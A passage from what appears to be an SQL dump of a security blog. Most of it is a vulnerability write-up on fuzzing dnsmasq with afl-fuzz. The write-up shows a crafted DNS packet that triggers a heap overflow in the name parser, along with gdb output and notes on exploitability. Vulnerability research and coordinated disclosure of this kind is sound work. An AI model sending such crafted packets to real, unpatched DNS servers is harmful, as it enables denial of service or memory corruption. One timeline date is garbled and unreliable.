domains (it will, of course, be able to connect outbound if it uses an ip address instead of a domain name):\n\r\n$ sudo ruby ./dnslogger.rb --A \"127.0.0.1\" --AAAA \"::1\"\r\n\nWhat else can you do?\nWell, I mean, if you have an authoritative DNS server, you can have a command-and-control channel over DNS. I\'m not going to dwell on that, but I\'ve written about it in the past :).\nConclusion\nThe entire point of this post is that: it\'s possible to tell if somebody is trying to connect to you (either as a TCP connection, sending an email, pinging you, etc) without them knowing that you know.\nAnd the coolest part of all this? It\'s totally invisible. As far as anybody can tell, the connection fails and that\'s all they know.\nIsn\'t DNS awesome?', '\'DNS\', \'Tools\'', 'https://blog.skullsecurity.org/2015/if-youre-a-pentester-you-should-love-dns');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (9, 'How I nearly almost saved the Internet, starring afl-fuzz and dnsmasq', 'Ron Bowes', '2015-7-15', 'If you know me, you know that I love DNS. I\'m not exactly sure how that happened, but I suspect that Ed Skoudis is at least partly to blame.\nAnyway, a project came up to evaluate dnsmasq, and being a DNS server - and a key piece of Internet infrastructure - I thought it would be fun! And it was! By fuzzing in a somewhat creative way, I found a really cool vulnerability that\'s almost certainly exploitable (though I haven\'t proven that for reasons that\'ll become apparent later).\nAlthough I started writing an exploit, I didn\'t finish it. I think it\'s almost certainly exploitable, so if you have some free time and you want to learn about exploit development, it\'s worthwhile having a look! Here\'s a link to the actual distribution of a vulnerable version, and I\'ll discuss the work I\'ve done so far at the end of this post.\nYou can also download my branch, which is similar to the vulnerable version (branched from it), the only difference is that it contains a bunch of fuzzing instrumentation and debug output around parsing names.\n\n.in { color: #dc322f; font-weight: bold; }\ndnsmasq\nFor those of you who don\'t know, dnsmasq is a service that you can run that handles a number of different protocols designed to configure your network: DNS, DHCP, DHCP6, TFTP, and more. We\'ll focus on DNS - I fuzzed the other interfaces and didn\'t find anything, though when it comes to fuzzing, absence of evidence isn\'t the same as evidence of absence.\nIt\'s primarily developed by a single author, Simon Kelley. It\'s had a reasonably clean history in terms of vulnerabilities, which may be a good thing (it\'s coded well) or a bad thing (nobody\'s looking) :)\nAt any rate, the author\'s response was impressive. I made a little timeline:\n\nMay 12, 2015: Discovered\nMay 14, 2015: Reported to project\nMay 14, 20252015: Project responded with a patch candidate\nMay 15, 2015: Patch committed\n\nThe fix was actually pushed out faster than I reported it! (I didn\'t report for a couple days because I was trying to determine how exploitable / scary it actually is - it turns out that yes, it\'s exploitable, but no, it\'s not scary - we\'ll get to why at the end).\nDNS - the important bits\nThe vulnerability is in the DNS name-parsing code, so it makes sense to spend a little time making sure you\'re familiar with DNS. If you\'re already familiar with how DNS packets and names are encoded, you can skip this section.\nNote that I\'m only going to cover the parts of DNS that matter to this particular vulnerability, which means I\'m going to leave out a bunch of stuff. Check out the RFCs (rfc1035, among others) or Wikipedia for complete details. As a general rule, I encourage everybody to learn enough to manually make requests to DNS servers, because that\'s an important skill to have - plus, it\'s only like 16 bytes to remember. :)\nDNS, at its core, is actually rather simple. A client wants to look up a hostname, so it sends a DNS packet containing a question to a DNS server (on UDP port 53, normally, but TCP can be used as well). Some magic happens, involving caches and recursion, then the server replies with a DNS message containing the original question, and zero or more answers.\nDNS packet structure\nThe structure of a DNS packet is:\n\n(int16) transaction id (trn_id)\n(int16) flags (which include QR [query/response], opcode, RD [recursion desired], RA [recursion available], and probably other stuff that I\'m forgetting)\n(int16) question count (qdcount)\n(int16) answer count (ancount)\n(int16) authority count (nscount)\n(int16) additional count (arcount)\n(variable) questions\n(variable) answers\n(variable) authorities\n(variable) additionals\n\nThe last four fields - questions, answers, authorities, and additionals - are collectively called \"resource records\". Resource records of different types have different properties, but we aren\'t going to worry about that. The general structure of a question record is:\n\n(variable) name (the important part!)\n(int16) type (A/AAAA/CNAME/etc.)\n(int16) class (basically always 0x0001, for Internet addresses)\n\nDNS names\nQuestions and answers typically contain a domain name. A domain name, as we typically see it, looks like:\nthis.is.a.name.skullseclabs.org\nBut in a resource records, there aren\'t actually any periods, instead, each field is preceded by its length, with a null terminator (or a zero-length field) at the end:\n\\x04this\\x02is\\x01a\\x04name\\x0cskullseclabs\\x03org\\x00\nThe maximum length of a field is 63 - 0x3f - bytes. If a field starts with 0x40, 0x80, 0xc0, and possibly others, it has a special meaning (we\'ll get to that shortly).\nQuestions and answers\nWhen you send a question to a DNS server, the packet looks something like:\n\n(header)\nquestion count = 1\nquestion 1: ANY record for skullsecurity.org?\n\nand the response looks like:\n\n(header)\nquestion count = 1\nanswer count = 11\nquestion 1: ANY record for \"skullsecurity.org\"?\nanswer 1: \"skullsecurity.org\" has a TXT record of \"oh hai NSA\"\nanswer 2: \"skullsecurity.org\" has a MX record for \"ASPMX.L.GOOGLE.com\".\nanswer 3: \"skullsecurity.org\" has a A record for \"206.220.196.59\"\n...\n\n(yes, those are some of my real records :) )\nIf you do the math, you\'ll see that \"skullsecurity.org\" takes up 18 bytes, and would be included in the response packet 12 times, counting the question, which means we\'re effectively wasting 18 * 11 or close to 200 bytes. In the old days, 200 bytes were a lot. Heck, in the new days, 200 bytes are still a lot when you\'re dealing with millions of requests.\nRecord pointers\nRemember how I said that name fields starting with numbers above 63 - 0x3f - are special? Well, the one we\'re going to pay attention to is 0xc0.\n0xc0 effectively means, \"the next byte is a pointer, starting from the first byte of the packet, to where you can find the rest of the name\".\nSo typically, you\'ll see:\n\n12-bytes header (trn_id + flags + counts)\nquestion 1: ANY record for \"skullsecurity.org\"\nanswer 1: \\xc0\\x0c has a TXT record of \"oh hai NSA\"\nanswer 2: \\xc0\\x0c ...\n\n\"\\xc0\" indicates a pointer is coming, and \"\\x0c\" says \"look 0x0c (12) bytes from the start of the packet\", which is immediately after the header. You can also use it as part of a domain name, so your answer could be \"\\x03www\\xc0\\x0c\", which would become \"www.skullsecurity.org\" (assuming that string was 12 bytes from the start).\nThis is only mildly relevant, but a common problem that DNS parsers (both clients and servers) have to deal with is the infinite loop attack. Basically, the following packet structure:\n\n12-byte header\nquestion 1: ANY record for \"\\xc0\\x0c\"\n\nBecause question 1 is self-referential, it reads itself over and over and the name never finishes parsing. dnsmasq solves this by limiting reference to 256 hops - that decision prevents a denial-of-service attack, but it\'s also what makes this vulnerability likely exploitable. :)\nSetting up the fuzz\nAll right, by now we\'re DNS experts, right? Good, because we\'re going to be building a DNS packet by hand right away!\nBefore we get to the actual vulnerability, I want to talk about how I set up the fuzzing. Being a networked application, it makes sense to use a network fuzzer; however, I really wanted to try out afl-fuzz from lcamtuf, which is a file-format fuzzer.\nafl-fuzz works as an intelligent file-format fuzzer that will instrument the executable (either by specially compiling it or using binary analysis) to determine whether or not it\'s hitting \"new\" code on each execution. It optimizes each cycle to take advantage of all the new code paths it\'s found. It\'s really quite cool!\nUnfortunately, DNS doesn\'t use files, it uses packets. But because the client and server each process only one single packet at a time, I decided to modify dnsmasq to read a packet from a file, parse it (either as a request or a response), then exit. That made it possible to fuzz with afl-fuzz.\nUnfortunately, that was actually pretty non-trivial. The parsing code and networking code were all mixed together. I ended up re-implementing \"recv_msg()\" and \"recv_from()\", among other things, and replacing their calls to those functions. That could also be done with a LD_PRELOAD hook, but because I had source that wasn\'t necessary. If you want to see the changes I made to make it possible to fuzz, you can search the codebase for \"#ifdef FUZZ\" - I made the fuzzing stuff entirely optional.\nIf you want to follow along, you should be able to reproduce the crash with the following commands (I\'m on 64-bit Linux, but I don\'t see why it wouldn\'t work elsewhere):\n\r\n$ git clone https://github.com/iagox86/dnsmasq-fuzzing\r\nCloning into \'dnsmasq-fuzzing\'...\r\n[...]\r\n$ cd dnsmasq-fuzzing/\r\n$ CFLAGS=-DFUZZ make -j10\r\n[...]\r\n$ ./src/dnsmasq -d --randomize-port --client-fuzz fuzzing/crashes/client-heap-overflow-1.bin\r\ndnsmasq: started, version  cachesize 150\r\ndnsmasq: compile time options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth DNSSEC loop-detect inotify\r\ndnsmasq: reading /etc/resolv.conf\r\n[...]\r\nSegmentation fault\r\n\nWarning: DNS is recursive, and in my fuzzing modifications I didn\'t disable the recursive requests. That means that dnsmasq will forward some of your traffic to upstream DNS servers, and that traffic could impact those severs (and I actually proved that, by accident; but we won\'t get into that :) ).\nDoing the actual fuzzing\nOnce you\'ve set up the program to be fuzzable, fuzzing it is actually really easy.\nFirst, you need a DNS request and response - that way, we can fuzz both sides (though ultimately, we don\'t need to for this particular vulnerability, since both the request and response parse names).\nIf you\'ve wasted your life like I have, you can just write the request by hand and send it to a server, then capture the response:\n\r\n$ mkdir -p fuzzing/client/input/\r\n$ mkdir -p fuzzing/client/output/\r\n$ echo -ne \"\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x06google\\x03com\\x00\\x00\\x01\\x00\\x01\" > fuzzing/client/input/request.bin\r\n$ mkdir -p fuzzing/server/input/\r\n$ mkdir -p fuzzing/server/output/\r\n$ cat request.bin | nc -vv -u 8.8.8.8 53 > fuzzing/server/input/response.bin\r\n\nTo break down the packet, in case you\'re curious\n\n\"\\x12\\x34\" - trn_id - just a random number\n\"\\x01\\x00\" - flags - I think that flag is RD - recursion desired\n\"\\x00\\x01\" - qdcount = 1\n\"\\x00\\x00\" - ancount = 0\n\"\\x00\\x00\" - nscount = 0\n\"\\x00\\x00\" - arcount = 0\n\"\\x06google\\x03com\\x00\" - name = \"google.com\"\n\"\\x00\\x01\" - type = A record\n\"\\x00\\x01\" - class = IN (Internet)\n\nYou can verify it\'s working by hexdump\'ing the response:\n\r\n$ hexdump -C response.bin\r\n00000000  12 34 81 80 00 01 00 0b  00 00 00 00 06 67 6f 6f  |.4...........goo|\r\n00000010  67 6c 65 03 63 6f 6d 00  00 01 00 01 c0 0c 00 01  |gle.com.........|\r\n00000020  00 01 00 00 01 2b 00 04  ad c2 21 67 c0 0c 00 01  |.....+....!g....|\r\n00000030  00 01 00 00 01 2b 00 04  ad c2 21 66 c0 0c 00 01  |.....+....!f....|\r\n00000040  00 01 00 00 01 2b 00 04  ad c2 21 69 c0 0c 00 01  |.....+....!i....|\r\n00000050  00 01 00 00 01 2b 00 04  ad c2 21 68 c0 0c 00 01  |.....+....!h....|\r\n00000060  00 01 00 00 01 2b 00 04  ad c2 21 63 c0 0c 00 01  |.....+....!c....|\r\n00000070  00 01 00 00 01 2b 00 04  ad c2 21 61 c0 0c 00 01  |.....+....!a....|\r\n00000080  00 01 00 00 01 2b 00 04  ad c2 21 6e c0 0c 00 01  |.....+....!n....|\r\n00000090  00 01 00 00 01 2b 00 04  ad c2 21 64 c0 0c 00 01  |.....+....!d....|\r\n000000a0  00 01 00 00 01 2b 00 04  ad c2 21 60 c0 0c 00 01  |.....+....!`....|\r\n000000b0  00 01 00 00 01 2b 00 04  ad c2 21 65 c0 0c 00 01  |.....+....!e....|\r\n000000c0  00 01 00 00 01 2b 00 04  ad c2 21 62              |.....+....!b|\r\n\nNotice how it starts with \"\\x12\\x34\" (the same transaction id I sent), has a question count of 1, has an answer count of 0x0b (11), and contains \"\\x06google\\x03com\\x00\" 12 bytes in (that\'s the question). That\'s basically what we discussed earlier. But the important part is, it has \"\\xc0\\x0c\" throughout. In fact, every answer starts with \"\\xc0\\x0c\", because every answer is to the first and only question.\nThat\'s exactly what I was talking about earlier - each of those 11 instances of \"\\xc0\\x0c\" saved about 10 bytes, so the packet is 110 bytes shorter than it would otherwise have been.\nNow that we have a base case for both the client and the server, we can compile the binary with afl-fuzz\'s instrumentation. Obviously, this command assumes that afl-fuzz is stored in \"~/tools/afl-1.77b\" - change as necessary. If you\'re trying to compile the original code, it doesn\'t accept CC= or CFLAGS= on the commandline unless you apply this patch first.\nHere\'s the compile command:\n\r\n$ CC=~/tools/afl-1.77b/afl-gcc CFLAGS=-DFUZZ make -j20\r\n\nand run the fuzzer:\n\r\n$ ~/tools/afl-1.77b/afl-fuzz -i fuzzing/client/input/ -o fuzzing/client/output/ ./dnsmasq --client-fuzz=@@\r\n\nyou can simultaneously fuzz the server, too, in a different window:\n\r\n$ ~/tools/afl-1.77b/afl-fuzz -i fuzzing/server/input/ -o fuzzing/server/output/ ./dnsmasq --server-fuzz=@@\r\n\nthen let them run a few hours, or possibly overnight.\nFor fun, I ran a third instance:\n\r\n$ mkdir -p fuzzing/hello/input\r\n$ echo \"hello\" > fuzzing/hello/input/hello.bin\r\n$ mkdir -p fuzzing/hello/output\r\n$ ~/tools/afl-1.77b/afl-fuzz -i fuzzing/fun/input/ -o fuzzing/fun/output/ ./dnsmasq --server-fuzz=@@\r\n\n...which, in spite of being seeded with \"hello\" instead of an actual DNS packet, actually found an order of magnitude more crashes than the proper packets, except with much, much uglier proofs of concept.. :)\nFuzz results\nI let this run overnight, specifically to re-create the crashes for this blog. In the morning (after roughly 20 hours of fuzzing), the results were:\n\n7 crashes starting with a well formed request\n10 crashes starting from a well formed response\n93 crashes starting from \"hello\"\n\nYou can download the base cases and results here, if you want.\nTriage\nAlthough we have over a hundred crashes, I know from experience that they\'re all caused by the same core problem. But not knowing that, I need to pick something to triage! The difference between starting from a well formed request and starting from a \"hello\" string is noticeable... to take the smallest PoC from \"hello\", we have:\n\r\ncrashes $ hexdump -C id\\:000024\\,sig\\:11\\,src\\:000234+000399\\,op\\:splice\\,rep\\:16\r\n00000000  68 00 00 00 00 01 00 02  e8 1f ec 13 07 06 e9 01  |h...............|\r\n00000010  67 02 e8 1f c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |g...............|\r\n00000020  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|\r\n00000030  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 b8 c0 c0 c0 c0 c0  |................|\r\n00000040  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|\r\n00000050  c0 c0 c0 c0 c0 c0 c0 c0  c0 af c0 c0 c0 c0 c0 c0  |................|\r\n00000060  c0 c0 c0 c0 cc 1c 03 10  c0 01 00 00 02 67 02 e8  |.............g..|\r\n00000070  1f eb ed 07 06 e9 01 67  02 e8 1f 2e 2e 10 2e 2e  |.......g........|\r\n00000080  00 07 2e 2e 2e 2e 00 07  01 02 07 02 02 02 07 06  |................|\r\n00000090  00 00 00 00 7e bd 02 e8  1f ec 07 07 01 02 07 02  |....~...........|\r\n000000a0  02 02 07 06 00 00 00 00  02 64 02 e8 1f ec 07 07  |.........d......|\r\n000000b0  06 ff 07 9c 06 49 2e 2e  2e 2e 00 07 01 02 07 02  |.....I..........|\r\n000000c0  02 02 05 05 e7 02 02 02  e8 03 02 02 02 02 80 c0  |................|\r\n000000d0  c0 c0 c0 c0 c0 c0 c0 c0  c0 80 1c 03 10 80 e6 c0  |................|\r\n000000e0  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|\r\n000000f0  c0 c0 c0 c0 c0 c0 b8 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|\r\n00000100  c0 c0 c0 c0 c0 c0 c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|\r\n00000110  c0 c0 c0 c0 c0 af c0 c0  c0 c0 c0 c0 c0 c0 c0 c0  |................|\r\n00000120  cc 1c 03 10 c0 01 00 00  02 67 02 e8 1f eb ed 07  |.........g......|\r\n00000130  00 95 02 02 02 05 e7 02  02 10 02 02 02 02 02 00  |................|\r\n00000140  00 80 03 02 02 02 f0 7f  c7 00 80 1c 03 10 80 e6  |................|\r\n00000150  00 95 02 02 02 05 e7 67  02 02 02 02 02 02 02 00  |.......g........|\r\n00000160  00 80                                             |..|\r\n\nOr, if we run afl-tmin on it to minimize:\n\r\n00000000  30 30 00 30 00 01 30 30  30 30 30 30 30 30 30 30  |00.0..0000000000|\r\n00000010  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n00000020  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n00000030  30 30 30 30 30 30 30 30  30 30 30 30 30 c0 c0 30  |0000000000000..0|\r\n00000040  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n00000050  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n00000060  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n00000070  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n00000080  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n00000090  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n000000a0  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n000000b0  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|\r\n000000c0  05 30 30 30 30 30 c0 c0\r\n\n(note the 0xc0 at the end - our old friend - but instead of figuring out \"\\xc0\\x0c\", the simplest case, it found a much more complex case)\nWhereas here are all four crashing messages from the valid request starting point:\n\r\ncrashes $ hexdump -C id\\:000000\\,sig\\:11\\,src\\:000034\\,op\\:flip2\\,pos\\:24\r\n00000000  12 34 01 00 00 01 00 00  00 00 00 00 06 67 6f 6f  |.4...........goo|\r\n00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|\r\n0000001c\r\n\n\r\ncrashes $ hexdump -C id\\:000001\\,sig\\:11\\,src\\:000034\\,op\\:havoc\\,rep\\:4\r\n00000000  12 34 08 00 00 01 00 00  e1 00 00 00 06 67 6f 6f  |.4...........goo|\r\n00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|\r\n0000001c\r\n\n\r\ncrashes $ hexdump -C id\\:000002\\,sig\\:11\\,src\\:000034\\,op\\:havoc\\,rep\\:2\r\n00000000  12 34 01 00 eb 00 00 00  00 00 00 00 06 67 6f 6f  |.4...........goo|\r\n00000010  67 6c 65 03 63 6f 6d c0  0c 01 00 01              |gle.com.....|\r\n\n\r\ncrashes $ hexdump -C id\\:000003\\,sig\\:11\\,src\\:000034\\,op\\:havoc\\,rep\\:4\r\n00000000  12 34 01 00 00 01 01 00  00 00 10 00 06 67 6f 6f  |.4...........goo|\r\n00000010  67 6c 65 03 63 6f 6d c0  0c 00 00 00 00 00 06 67  |gle.com........g|\r\n00000020  6f 6f 67 6c 65 03 63 6f  6d c0 00 01 00 01        |oogle.com.....|\r\n0000002e\r\n\nThe first three crashes are interesting, because they\'re very similar. The only differences are the flags field (0x0100 or 0x0800) and the count fields (the first is unmodified, the second has 0xe100 \"authority\" records listed, and the third has 0xeb00 \"question\" records). Presumably, that stuff doesn\'t matter, since random-looking values work.\nAlso note that near the end of every message, we see our old friend again: \"\\xc0\\x0c\".\nWe can run afl-tmin on the first one to get the tightest message we can:\n\r\n00000000  30 30 30 30 30 30 30 30  30 30 30 30 06 30 6f 30  |000000000000.0o0|\r\n00000010  30 30 30 03 30 30 30 c0  0c                       |000.000..|\r\n\nAs predicted, the question and answer counts don\'t matter. All that matters is the name\'s length fields and the \"\\xc0\\x0c\". Oddly it included the \"o\" from google.com, which is probably a bug (my fuzzing instrumentation isn\'t perfect because due to requests going to the Internet, the result isn\'t always deterministic).\nThe vulnerability\nNow that we have a decent PoC, let\'s check it out in a debugger:\n\r\n$ gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./min.bin\r\nReading symbols from ./dnsmasq...done.\r\nUnable to determine compiler version.\r\nSkipping loading of libstdc++ pretty-printers for now.\r\n(gdb) run\r\n[...]\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n__strcpy_sse2 () at ../sysdeps/x86_64/multiarch/../strcpy.S:135\r\n135     ../sysdeps/x86_64/multiarch/../strcpy.S: No such file or directory.\r\n\nIt crashed in strcpy. Fun! Let\'s see the line it crashed on:\n\r\n(gdb) x/i $rip\r\n=> 0x7ffff73cc600 <__strcpy_sse2+192>:  mov    BYTE PTR [rdx],al\r\n(gdb) print/x $rdx\r\n$1 = 0x0\r\n\nOh, a null-pointer write. Seems pretty lame.\nHonestly, when I got here, I lost steam. Null-pointer dereferences need to be fixed, especially because they can hide other bugs, but they aren\'t going to earn me l33t status. So I would have to fix it or deal with hundreds of crappy results.\nIf we look at the packet in more detail, the name it\'s parsing is essentially: \"\\x06AAAAAA\\x03AAA\\xc0\\x0c\" (changed \'0\' to \'A\' to make it easier on the eyes). The \"\\xc0\\x0c\" construct reference 12 bytes into the message, which is the start of the name. When it\'s parsed, after one round, it\'ll be \"\\x06AAAAAA\\x03AAA\\x06AAAAAA\\x03AAA\\xc0\\x0c\". But then it reaches the \"\\xc0\\x0c\" again, and goes back to the beginning. Basically, it infinite loops in the name parser.\nSo, it\'s obvious that a self-referential name causes the problem. But why?\nI tracked down the code that handles 0xc0. It\'s in rfc1035.c, and looks like:\n\r\n     if (label_type == 0xc0) /* pointer */\r\n        {\r\n          if (!CHECK_LEN(header, p, plen, 1))\r\n            return 0;\r\n\r\n          /* get offset */\r\n          l = (l&0x3f) << 8;\r\n          l |= *p++;\r\n\r\n          if (!p1) /* first jump, save location to go back to */\r\n            p1 = p;\r\n\r\n          hops++; /* break malicious infinite loops */\r\n          if (hops > 255)\r\n          {\r\n            printf(\"Too many hops!\\n\");\r\n            printf(\"Returning: [%d] %s\\n\", ((uint64_t)cp) - ((uint64_t)name), name);\r\n            return 0;\r\n          }\r\n\r\n          p = l + (unsigned char *)header;\r\n        }\r\n\nIf look at that code, everything looks pretty okay (and for what it\'s worth, the printf()s are my instrumentation and aren\'t in the original). If that\'s not the problem, the only other field type being parsed is the name part (ie, the part without 0x40/0xc0/etc. in front). Here\'s the code (with a bunch of stuff removed and the indents re-flowed):\n\r\n  namelen += l;\r\n  if (namelen+1 >= MAXDNAME)\r\n  {\r\n    printf(\"namelen is too long!\\n\"); /* <-- This is what triggers. */\r\n    printf(\"Returning: [%d] %s\\n\", ((uint64_t)cp) - ((uint64_t)name), name);\r\n    return 0;\r\n  }\r\n  if (!CHECK_LEN(header, p, plen, l))\r\n  {\r\n    printf(\"CHECK_LEN failed!\\n\");\r\n    return 0;\r\n  }\r\n  for(j=0; j<l; j++, p++)\r\n  {\r\n    unsigned char c = *p;\r\n    if (c != 0 && c != \'.\')\r\n      *cp++ = c;\r\n    else\r\n      return 0;\r\n  }\r\n  *cp++ = \'.\';\r\n\nThis code runs for each segment that starts with a value less than 64 (\"google\" and \"com\", for example).\nAt the start, l is the length of the segment (so 6 in the case of \"google\"). It adds that to the current TOTAL length - namelen - then checks if it\'s too long - this is the check that prevents a buffer overflow.\nThen it reads in l bytes, one at a time, and copies them into a buffer - cp - which happens to be on the heap. the namelen check prevents that from overflowing.\nThen it copies a period into the buffer and doesn\'t increment namelen.\nDo you see the problem there? It adds l to the total length of the buffer, then it reads in l + 1 bytes, counting the period. Oops?\nIt turns out, you can mess around with the length and size of substrings quite a bit to get a lot of control over what\'s written where, but exploiting it is as simple as doing a lookup for \"\\x08AAAAAAAA\\xc0\\x0c\":\n\r\n$ echo -ne \'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x08AAAAAAAA\\xc0\\x0c\\x00\\x00\\x01\\x00\\x01\' > crash.bin\r\n$ ./dnsmasq -d --randomize-port --client-fuzz=./crash.bin\r\n[...]\r\nSegmentation fault\r\n\nHowever, there are two termination conditions: it\'ll only loop a grand total of 255 times, and it stops after namelen reaches 1024 (non-period) bytes. So coming up with the best possible balance to overwrite what you want is actually pretty tricky - possibly even requires a bit of calculus (or, if you\'re an engineer, a program that can optimize it for you :) ). \nI should also mention: the reason the \"\\xc0\\x0c\" is needed in the first place is that it\'s impossible to have a name string in that\'s 1024 bytes - somewhere along the line, it runs afoul of a length check. The \"\\xc0\\x0c\" method lets us repeat stuff over and over, sort of like decompressing a small string into memory, overflowing the buffer.\nExploitability\nI mentioned earlier that it\'s a null-pointer deref:\n\r\n(gdb) x/i $rip\r\n=> 0x7ffff73cc600 <__strcpy_sse2+192>:  mov    BYTE PTR [rdx],al\r\n(gdb) print/x $rdx\r\n$1 = 0x0\r\n\nLet\'s try again with the crash.bin file we just created, using \"\\x08AAAAAAAA\\xc0\\x0c\" as the payload:\n\r\n$ echo -ne \'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x08AAAAAAAA\\xc0\\x0c\\x00\\x00\\x01\\x00\\x01\' > crash.bin\r\n$ gdb -q --args ./dnsmasq -d --randomize-port --client-fuzz=./crash.bin\r\n[...]\r\n(gdb) run\r\n[...]\r\n(gdb) x/i $rip\r\n=> 0x449998 <answer_request+1064>:      mov    DWORD PTR [rdx+0x20],0x0\r\n(gdb) print/x $rdx\r\n$1 = 0x4141412e41414141\r\n\nWoah.. that\'s not a null-pointer dereference! That\'s a write-NUL-byte-to-arbitrary-memory! Those might be exploitable!\nAs I mentioned earlier, this is actually a heap overflow. The interesting part is, the heap memory is allocated once - immediately after the program starts - and right after, a heap for the global settings object (daemon) is allocated. That means that we have effectively full control of this object, at least the first couple hundred bytes:\n\r\nextern struct daemon {\r\n  /* datastuctures representing the command-line and.\r\n     config file arguments. All set (including defaults)\r\n     in option.c */\r\n\r\n  unsigned int options, options2;\r\n  struct resolvc default_resolv, *resolv_files;\r\n  time_t last_resolv;\r\n  char *servers_file;\r\n  struct mx_srv_record *mxnames;\r\n  struct naptr *naptr;\r\n  struct txt_record *txt, *rr;\r\n  struct ptr_record *ptr;\r\n  struct host_record *host_records, *host_records_tail;\r\n  struct cname *cnames;\r\n  struct auth_zone *auth_zones;\r\n  struct interface_name *int_names;\r\n  char *mxtarget;\r\n  int addr4_netmask;\r\n  int addr6_netmask;\r\n  char *lease_file;.\r\n  char *username, *groupname, *scriptuser;\r\n  char *luascript;\r\n  char *authserver, *hostmaster;\r\n  struct iname *authinterface;\r\n  struct name_list *secondary_forward_server;\r\n  int group_set, osport;\r\n  char *domain_suffix;\r\n  struct cond_domain *cond_domain, *synth_domains;\r\n  char *runfile;.\r\n  char *lease_change_command;\r\n  struct iname *if_names, *if_addrs, *if_except, *dhcp_except, *auth_peers, *tftp_interfaces;\r\n  struct bogus_addr *bogus_addr, *ignore_addr;\r\n  struct server *servers;\r\n  struct ipsets *ipsets;\r\n  int log_fac; /* log facility */\r\n  char *log_file; /* optional log file */                                                                                                              int max_logs;  /* queue limit */\r\n  int cachesize, ftabsize;\r\n  int port, query_port, min_port;\r\n  unsigned long local_ttl, neg_ttl, max_ttl, min_cache_ttl, max_cache_ttl, auth_ttl;\r\n  struct hostsfile *addn_hosts;\r\n  struct dhcp_context *dhcp, *dhcp6;\r\n  struct ra_interface *ra_interfaces;\r\n  struct dhcp_config *dhcp_conf;\r\n  struct dhcp_opt *dhcp_opts, *dhcp_match, *dhcp_opts6, *dhcp_match6;\r\n  struct dhcp_vendor *dhcp_vendors;\r\n  struct dhcp_mac *dhcp_macs;\r\n  struct dhcp_boot *boot_config;\r\n  struct pxe_service *pxe_services;\r\n  struct tag_if *tag_if;.\r\n  struct addr_list *override_relays;\r\n  struct dhcp_relay *relay4, *relay6;\r\n  int override;\r\n  int enable_pxe;\r\n  int doing_ra, doing_dhcp6;\r\n  struct dhcp_netid_list *dhcp_ignore, *dhcp_ignore_names, *dhcp_gen_names;.\r\n  struct dhcp_netid_list *force_broadcast, *bootp_dynamic;\r\n  struct hostsfile *dhcp_hosts_file, *dhcp_opts_file, *dynamic_dirs;\r\n  int dhcp_max, tftp_max;\r\n  int dhcp_server_port, dhcp_client_port;\r\n  int start_tftp_port, end_tftp_port;.\r\n  unsigned int min_leasetime;\r\n  struct doctor *doctors;\r\n  unsigned short edns_pktsz;\r\n  char *tftp_prefix;.\r\n  struct tftp_prefix *if_prefix; /* per-interface TFTP prefixes */\r\n  unsigned int duid_enterprise, duid_config_len;\r\n  unsigned char *duid_config;\r\n  char *dbus_name;\r\n  unsigned long soa_sn, soa_refresh, soa_retry, soa_expiry;\r\n#ifdef OPTION6_PREFIX_CLASS.\r\n  struct prefix_class *prefix_classes;\r\n#endif\r\n#ifdef HAVE_DNSSEC\r\n  struct ds_config *ds;\r\n  char *timestamp_file;\r\n#endif\r\n\r\n  /* globally used stuff for DNS */\r\n  char *packet; /* packet buffer */\r\n  int packet_buff_sz; /* size of above */\r\n  char *namebuff; /* MAXDNAME size buffer */\r\n#ifdef HAVE_DNSSEC\r\n  char *keyname; /* MAXDNAME size buffer */\r\n  char *workspacename; /* ditto */\r\n#endif\r\n  unsigned int local_answer, queries_forwarded, auth_answer;\r\n  struct frec *frec_list;\r\n  struct serverfd *sfds;\r\n  struct irec *interfaces;\r\n  struct listener *listeners;\r\n  struct server *last_server;\r\n  time_t forwardtime;\r\n  int forwardcount;\r\n  struct server *srv_save; /* Used for resend on DoD */\r\n  size_t packet_len;       /*      \"        \"        */\r\n  struct randfd *rfd_save; /*      \"        \"        */\r\n  pid_t tcp_pids[MAX_PROCS];\r\n  struct randfd randomsocks[RANDOM_SOCKS];\r\n  int v6pktinfo;.\r\n  struct addrlist *interface_addrs; /* list of all addresses/prefix lengths associated with all local interfaces */\r\n  int log_id, log_display_id; /* ids of transactions for logging */\r\n  union mysockaddr *log_source_addr;\r\n\r\n  /* DHCP state */\r\n  int dhcpfd, helperfd, pxefd;.\r\n#ifdef HAVE_INOTIFY\r\n  int inotifyfd;\r\n#endif\r\n#if defined(HAVE_LINUX_NETWORK)\r\n  int netlinkfd;\r\n#elif defined(HAVE_BSD_NETWORK)\r\n  int dhcp_raw_fd, dhcp_icmp_fd, routefd;\r\n#endif\r\n  struct 